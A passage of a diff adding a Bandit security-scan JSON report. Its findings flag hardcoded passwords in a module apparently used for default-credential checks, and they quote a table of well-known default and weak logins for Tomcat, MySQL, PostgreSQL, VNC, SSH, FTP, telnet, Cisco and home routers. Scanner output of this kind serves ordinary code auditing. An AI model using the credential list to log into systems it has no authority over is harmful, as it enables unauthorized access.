+        173,
+        174,
+        175,
+        176,
+        177,
+        178
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "27     \"tomcat\": [\n28         {\"username\": \"tomcat\", \"password\": \"tomcat\", \"source\": \"builtin\", \"note\": \"Tomcat Manager \u9ed8\u8ba4\"},\n29         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\", \"note\": \"Tomcat Manager \u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n",
+      "col_offset": 31,
+      "end_col_offset": 41,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'tomcat'",
+      "line_number": 28,
+      "line_range": [
+        28
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "28         {\"username\": \"tomcat\", \"password\": \"tomcat\", \"source\": \"builtin\", \"note\": \"Tomcat Manager \u9ed8\u8ba4\"},\n29         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\", \"note\": \"Tomcat Manager \u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n30         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u7a7a\u5bc6\u7801\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 29,
+      "line_range": [
+        29
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "29         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\", \"note\": \"Tomcat Manager \u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n30         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u7a7a\u5bc6\u7801\"},\n31         {\"username\": \"role1\", \"password\": \"tomcat\", \"source\": \"builtin\", \"note\": \"tomcat-users.xml \u9ed8\u8ba4\u89d2\u8272\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 30,
+      "line_range": [
+        30
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "30         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u7a7a\u5bc6\u7801\"},\n31         {\"username\": \"role1\", \"password\": \"tomcat\", \"source\": \"builtin\", \"note\": \"tomcat-users.xml \u9ed8\u8ba4\u89d2\u8272\"},\n32         {\"username\": \"both\", \"password\": \"tomcat\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'tomcat'",
+      "line_number": 31,
+      "line_range": [
+        31
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "31         {\"username\": \"role1\", \"password\": \"tomcat\", \"source\": \"builtin\", \"note\": \"tomcat-users.xml \u9ed8\u8ba4\u89d2\u8272\"},\n32         {\"username\": \"both\", \"password\": \"tomcat\", \"source\": \"builtin\"},\n33     ],\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'tomcat'",
+      "line_number": 32,
+      "line_range": [
+        32
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "34     \"mysql\": [\n35         {\"username\": \"root\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"MySQL \u9ed8\u8ba4 root \u7a7a\u5bc6\u7801\"},\n36         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\", \"note\": \"\u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 35,
+      "line_range": [
+        35
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "35         {\"username\": \"root\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"MySQL \u9ed8\u8ba4 root \u7a7a\u5bc6\u7801\"},\n36         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\", \"note\": \"\u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n37         {\"username\": \"root\", \"password\": \"toor\", \"source\": \"builtin\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'root'",
+      "line_number": 36,
+      "line_range": [
+        36
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "36         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\", \"note\": \"\u5e38\u89c1\u5f31\u53e3\u4ee4\"},\n37         {\"username\": \"root\", \"password\": \"toor\", \"source\": \"builtin\"},\n38         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'toor'",
+      "line_number": 37,
+      "line_range": [
+        37
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "37         {\"username\": \"root\", \"password\": \"toor\", \"source\": \"builtin\"},\n38         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n39     ],\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 38,
+      "line_range": [
+        38
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "40     \"postgres\": [\n41         {\"username\": \"postgres\", \"password\": \"postgres\", \"source\": \"builtin\", \"note\": \"PostgreSQL \u9ed8\u8ba4\"},\n42         {\"username\": \"postgres\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u4fe1\u4efb\u672c\u5730\u8fde\u63a5\"},\n",
+      "col_offset": 33,
+      "end_col_offset": 43,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'postgres'",
+      "line_number": 41,
+      "line_range": [
+        41
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "41         {\"username\": \"postgres\", \"password\": \"postgres\", \"source\": \"builtin\", \"note\": \"PostgreSQL \u9ed8\u8ba4\"},\n42         {\"username\": \"postgres\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u4fe1\u4efb\u672c\u5730\u8fde\u63a5\"},\n43         {\"username\": \"postgres\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 33,
+      "end_col_offset": 43,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 42,
+      "line_range": [
+        42
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "42         {\"username\": \"postgres\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u90e8\u5206\u7248\u672c\u4fe1\u4efb\u672c\u5730\u8fde\u63a5\"},\n43         {\"username\": \"postgres\", \"password\": \"admin\", \"source\": \"builtin\"},\n44     ],\n",
+      "col_offset": 33,
+      "end_col_offset": 43,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 43,
+      "line_range": [
+        43
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "45     \"vnc\": [\n46         {\"username\": \"\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"VNC \u65e0\u8ba4\u8bc1\u6a21\u5f0f\"},\n47         {\"username\": \"\", \"password\": \"password\", \"source\": \"builtin\"},\n",
+      "col_offset": 25,
+      "end_col_offset": 35,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 46,
+      "line_range": [
+        46
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "46         {\"username\": \"\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"VNC \u65e0\u8ba4\u8bc1\u6a21\u5f0f\"},\n47         {\"username\": \"\", \"password\": \"password\", \"source\": \"builtin\"},\n48         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 25,
+      "end_col_offset": 35,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'password'",
+      "line_number": 47,
+      "line_range": [
+        47
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "47         {\"username\": \"\", \"password\": \"password\", \"source\": \"builtin\"},\n48         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n49     ],\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 48,
+      "line_range": [
+        48
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "50     \"ssh\": [\n51         {\"username\": \"root\", \"password\": \"toor\", \"source\": \"builtin\"},\n52         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'toor'",
+      "line_number": 51,
+      "line_range": [
+        51
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "51         {\"username\": \"root\", \"password\": \"toor\", \"source\": \"builtin\"},\n52         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\"},\n53         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'root'",
+      "line_number": 52,
+      "line_range": [
+        52
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "52         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\"},\n53         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n54         {\"username\": \"pi\", \"password\": \"raspberry\", \"source\": \"builtin\", \"note\": \"\u6811\u8393\u6d3e\u9ed8\u8ba4\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 53,
+      "line_range": [
+        53
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "53         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n54         {\"username\": \"pi\", \"password\": \"raspberry\", \"source\": \"builtin\", \"note\": \"\u6811\u8393\u6d3e\u9ed8\u8ba4\"},\n55         {\"username\": \"ubuntu\", \"password\": \"ubuntu\", \"source\": \"builtin\"},\n",
+      "col_offset": 27,
+      "end_col_offset": 37,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'raspberry'",
+      "line_number": 54,
+      "line_range": [
+        54
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "54         {\"username\": \"pi\", \"password\": \"raspberry\", \"source\": \"builtin\", \"note\": \"\u6811\u8393\u6d3e\u9ed8\u8ba4\"},\n55         {\"username\": \"ubuntu\", \"password\": \"ubuntu\", \"source\": \"builtin\"},\n56     ],\n",
+      "col_offset": 31,
+      "end_col_offset": 41,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'ubuntu'",
+      "line_number": 55,
+      "line_range": [
+        55
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "57     \"ftp\": [\n58         {\"username\": \"anonymous\", \"password\": \"anonymous@\", \"source\": \"builtin\", \"note\": \"\u533f\u540d FTP\"},\n59         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 34,
+      "end_col_offset": 44,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'anonymous@'",
+      "line_number": 58,
+      "line_range": [
+        58
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "58         {\"username\": \"anonymous\", \"password\": \"anonymous@\", \"source\": \"builtin\", \"note\": \"\u533f\u540d FTP\"},\n59         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n60         {\"username\": \"ftp\", \"password\": \"ftp\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 59,
+      "line_range": [
+        59
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "59         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n60         {\"username\": \"ftp\", \"password\": \"ftp\", \"source\": \"builtin\"},\n61     ],\n",
+      "col_offset": 28,
+      "end_col_offset": 38,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'ftp'",
+      "line_number": 60,
+      "line_range": [
+        60
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "62     \"telnet\": [\n63         {\"username\": \"root\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u65e7\u8bbe\u5907\u5e38\u89c1\u7a7a\u5bc6\u7801\"},\n64         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 63,
+      "line_range": [
+        63
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "63         {\"username\": \"root\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"\u65e7\u8bbe\u5907\u5e38\u89c1\u7a7a\u5bc6\u7801\"},\n64         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n65         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 64,
+      "line_range": [
+        64
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "64         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n65         {\"username\": \"root\", \"password\": \"root\", \"source\": \"builtin\"},\n66     ],\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'root'",
+      "line_number": 65,
+      "line_range": [
+        65
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "67     \"cisco\": [\n68         {\"username\": \"\", \"password\": \"cisco\", \"source\": \"builtin\", \"note\": \"Cisco \u8bbe\u5907\u9ed8\u8ba4 enable\"},\n69         {\"username\": \"admin\", \"password\": \"cisco\", \"source\": \"builtin\"},\n",
+      "col_offset": 25,
+      "end_col_offset": 35,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'cisco'",
+      "line_number": 68,
+      "line_range": [
+        68
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "68         {\"username\": \"\", \"password\": \"cisco\", \"source\": \"builtin\", \"note\": \"Cisco \u8bbe\u5907\u9ed8\u8ba4 enable\"},\n69         {\"username\": \"admin\", \"password\": \"cisco\", \"source\": \"builtin\"},\n70         {\"username\": \"cisco\", \"password\": \"cisco\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'cisco'",
+      "line_number": 69,
+      "line_range": [
+        69
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "69         {\"username\": \"admin\", \"password\": \"cisco\", \"source\": \"builtin\"},\n70         {\"username\": \"cisco\", \"password\": \"cisco\", \"source\": \"builtin\"},\n71         {\"username\": \"enable\", \"password\": \"cisco\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'cisco'",
+      "line_number": 70,
+      "line_range": [
+        70
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "70         {\"username\": \"cisco\", \"password\": \"cisco\", \"source\": \"builtin\"},\n71         {\"username\": \"enable\", \"password\": \"cisco\", \"source\": \"builtin\"},\n72     ],\n",
+      "col_offset": 31,
+      "end_col_offset": 41,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'cisco'",
+      "line_number": 71,
+      "line_range": [
+        71
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "73     \"router\": [\n74         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\", \"note\": \"\u5bb6\u7528\u8def\u7531\u5668\u901a\u7528\"},\n75         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 74,
+      "line_range": [
+        74
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "74         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\", \"note\": \"\u5bb6\u7528\u8def\u7531\u5668\u901a\u7528\"},\n75         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n76         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'password'",
+      "line_number": 75,
+      "line_range": [
+        75
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "75         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n76         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\"},\n77         {\"username\": \"root\", \"password\": \"12345\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 76,
+      "line_range": [
+        76
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "76         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\"},\n77         {\"username\": \"root\", \"password\": \"12345\", \"source\": \"builtin\"},\n78     ],\n",
+      "col_offset": 29,
+      "end_col_offset": 39,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: '12345'",
+      "line_number": 77,
+      "line_range": [
+        77
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
